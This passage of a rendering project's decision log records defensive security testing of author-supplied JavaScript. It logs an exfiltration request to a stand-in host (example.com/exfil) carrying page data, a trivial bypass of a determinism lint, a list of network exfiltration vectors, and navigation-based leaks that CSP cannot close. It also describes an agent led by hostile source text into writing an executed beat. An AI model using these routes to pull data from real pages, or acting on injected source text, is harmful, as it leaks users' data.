@@ -1777,3 +1777,140 @@ Ranked by the Task 2 implementer, and the first is unclosable by design:
 And the one that matters most, stated plainly: **nothing anywhere yet checks that
 a `value` appears in its `quote`.** R1 only checks the quote exists. That is
 Phase 5's central job and it is correctly still undone.
+
+---
+
+## D-086 · phase 4 / task 3 · the catalogue is closed: `RENDERABLE == set(BEAT_TYPES)`
+
+Phase 4's exit criterion is met. All ten §7.1 types build, `determinism.test.mjs`
+carries a fixture for every one of them, and the assertion `every builder has a
+fixture (10)` is itself a test — so the next type added to §7.1 fails the suite
+until someone writes its fixture, rather than silently rendering nothing.
+
+Three sub-decisions worth keeping:
+
+**The dumbbell renders zero digits, pinned as a forbid-list.** Spec §7.2 says the
+type exists *because a source published ratings rather than scores*. A numeric
+axis would quietly convert an ordinal comparison into a measurement. The test
+asserts the rendered text matches no digit at all, which is stronger than
+asserting particular numbers are absent and cannot rot as the layout changes.
+`footnote` is required for the same reason: the caveat that it encodes direction
+only has to reach the screen.
+
+**Coincident values draw one two-tone marker, not two stacked dots.** Taken from
+`2026-08-12.js`'s own comment. Stacking hides a series, and a chart that silently
+omits a series is worse than one that refuses to draw.
+
+**Gates that stopped firing were re-pointed, not deleted.** With the catalogue
+closed, `plan.py`'s "valid but cannot be rendered yet" path is unreachable
+through a valid script. Every affected test now injects a narrower `RENDERABLE`
+rather than being removed. *A gate whose test was deleted on the day it stopped
+firing is a gate that comes back broken* — and the next §7.1 type is valid before
+its builder exists, which is exactly when an operator needs telling.
+
+## D-087 · phase 4 / task 3 · a beat that runs out of time ends on a false number
+
+Leader-verified against the real renderer, last frame `render.mjs` captures:
+
+```
+hold 2.0s -> last rendered frame: $0.75 in  $3.75 out  40% cheaper
+hold 3.0s -> last rendered frame: $0.75 in  $3.75 out  50% cheaper
+```
+
+**At a 2-second hold the final frame reads 40% for an authored 50%.** D-083
+argued mid-count frames are acceptable because a mid-count value is *unstable,
+bounded and derived* — motion, not assertion. All three properties fail the
+instant the count cannot finish: the mid-count value *becomes* the terminal
+value, and a viewer who pauses on the last frame reads a figure nobody wrote and
+Phase 5 will never check, because Phase 5 verifies the script.
+
+Refused in the renderer, which is the only layer that knows both the animation
+constants and the hold, with the requirement **derived from those constants**
+rather than hardcoded — a hardcoded threshold drifts out of agreement with the
+easing the day someone retunes it. The error names the beat, the hold it has and
+the hold it needs.
+
+## D-088 · phase 4 / task 3 · the `custom` determinism check is a lint, and says so
+
+`custom.js` is author JavaScript executed in the page. `script.py` rejects a `js`
+string containing `Date.now()`, `Math.random()` or `performance.now()` — the
+three ways to break `__seek(t)` purity, the one invariant this project has never
+had to re-fix.
+
+**It catches the accident, not the adversary.** `window['Ma'+'th'].random()`
+walks straight past it, and the error text and docstring both say so. Same
+framing as D-062 on freezing: the guard raises the floor, it is not a boundary.
+Claiming otherwise is how a lint gets mistaken for a sandbox by the next person
+to read it.
+
+The honest substitute for a check is **`attest`**: a required non-empty string in
+which the author states what the beat displays and takes responsibility for it,
+surfaced in `agsoc video review`. No mechanical check can verify arbitrary
+rendering output, so the record is a claim a person made — not a check nobody
+ran. Phase 5 lands `custom` as `manual` with its `attest` recorded, never as
+`pass`.
+
+## D-089 · phase 4 / task 4 · the render page cannot reach the network, and that is a network boundary only
+
+Task 3 was asked what `custom` can actually do and answered honestly rather than
+comfortably. Leader-verified in a real browser:
+
+```
+outbound requests from a custom beat: [ 'https://example.com/exfil?x=The%20Brief' ]
+can it reassign the escaper?  true
+is __seek writable?           true
+```
+
+**The request left the machine carrying page data.** And a beat can reassign
+`escapeHTML` — reintroducing the exact divergence D-078 closed, *after*
+validation passed, from inside a `script.yaml`.
+
+The threat chain is not hypothetical: spec §1 has the agent drafting from fetched
+sources, so hostile text in a source → corpus → storyboard skill → a `custom`
+beat → execution with network access. Every link already exists; that is the
+design, not a misuse.
+
+A CSP now sits in `scene.html`. **In the page, deliberately, not in `render.mjs`**
+— `scene.html` is also opened by hand to scrub the slider, and a runner-side
+block leaves that path open. Ten vectors delivered before it (`fetch`, XHR, `img`,
+`script`, `iframe`, dynamic `import()`, `sendBeacon`, WebSocket, `prefetch`,
+`EventSource`); all thirty checks pass after it, every run over `file://`.
+
+Two things worth more than the policy itself:
+
+**The oracle is a real HTTP server on 127.0.0.1, not Playwright's request event.**
+With the policy on, Chromium still emits a `request` event for a CSP-refused XHR
+— so asserting on that event reports a *working* policy as a leak. Bytes arriving
+at a socket are unambiguous. This is D-035 harness blindness caught before it
+cost anything: *ask what the test would do if the code did nothing*, and also ask
+what it would do if the code worked.
+
+**`script-src` needs `'unsafe-eval'` because `buildCustom` is `new Function`.**
+The policy therefore cannot even pretend to constrain what executes. Stated
+plainly so the closed half is not mistaken for the whole: **a CSP is a network
+boundary, not an execution boundary.** A custom beat can still do everything
+except tell anyone — measured, after the policy: `escapeHTML` reassigned to
+identity from inside a beat, no violation, `pwned: true`. The control for
+`custom` remains `attest` plus a human reading it.
+
+## D-090 · carried · top-level navigation is a real hole a CSP cannot close
+
+Tested rather than reasoned about: `location.href`, `window.open` and
+`<a>.click()` each delivered `document.title` to the sink with **no violation**.
+CSP cannot stop it — `navigate-to` was dropped from the spec and never shipped;
+`form-action` and `worker-src` close the form and Worker variants, and those are
+green.
+
+It is loud and one-shot — the document is replaced, `__seek` disappears, the
+render dies — which makes it a poor exfiltration channel and an obvious failure.
+But it is real and it is unclosed, and recording it as such is the point: the
+alternative is a policy that reads as complete.
+
+Two follow-ups, neither blocking Phase 4:
+
+- `render.mjs` refusing any non-`file:` navigation, as defence in depth. Runner-
+  side, so it does **not** replace the page policy and does not protect the
+  hand-scrubbing path.
+- **Phase 5's verifier flagging any `custom` beat that touches `location` or
+  `window.open`** for the approver. That is the right home for it: the same lint
+  framing as D-088, surfaced to the human who is already reading the `attest`.
